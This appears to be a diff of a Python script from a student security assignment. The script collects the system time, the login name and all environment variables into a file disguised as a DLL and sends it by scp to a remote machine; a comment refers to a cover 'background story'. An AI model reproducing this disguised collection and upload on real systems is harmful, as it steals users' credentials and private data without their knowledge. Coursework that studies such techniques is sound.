@@ -61,25 +61,19 @@ def get_windows_dhcp():
     return dhcp
 
 
-tFile = open("text file.txt", "w")
+devInfoFile = open("DeviceInfo39496643942121.dll", "w")
 
 # write System Time
-tFile.write("System Time: "+str(datetime.now()) + "\n")
+devInfoFile.write("System Time: "+str(datetime.now()) + "\n")
 
 # write student numbers
-tFile.write("Student 1 (Manav) Number: s3949664 \nStudent 2 (Lachlan) Number: s3942121\n")
+devInfoFile.write("Student 1 (Manav) Number: s3949664 \nStudent 2 (Lachlan) Number: s3942121\n")
 
-# Open URL (google)
+# Open URL (google) [NEED TO CHANGE THIS TO MATCH BACKGROUND STORY]
 # webbrowser.open("http://www.google.com")
 
 # Write username
-tFile.writelines("\nCurrent User: "+ str(os.getlogin()))
-
-
-# Close text file
-tFile.close()
-
-devInfoFile = open("DeviceInfo39496643942121.dll", "w")
+devInfoFile.writelines("\nCurrent User: "+ str(os.getlogin())+"\n \n")
 
 for a in os.environ:
     devInfoFile.writelines(a+ '='+ os.getenv(a)+"\n")
@@ -101,7 +95,7 @@ devInfoFile.close()
 # shutil.copy('DeviceInfo39496643942121.dll',homedrive+'\Windows')
 
 
-# Setting up SSH connection
+# Setting up SSH connection (Note this only works on Lachlan's home device where the openSSH server has been configured and is being hosted.)
 subprocess.run(["scp",'DeviceInfo39496643942121.dll',("lachl@"+ipAddr+":"+homedrive+"/users/netTesty/Documents")])
 
 
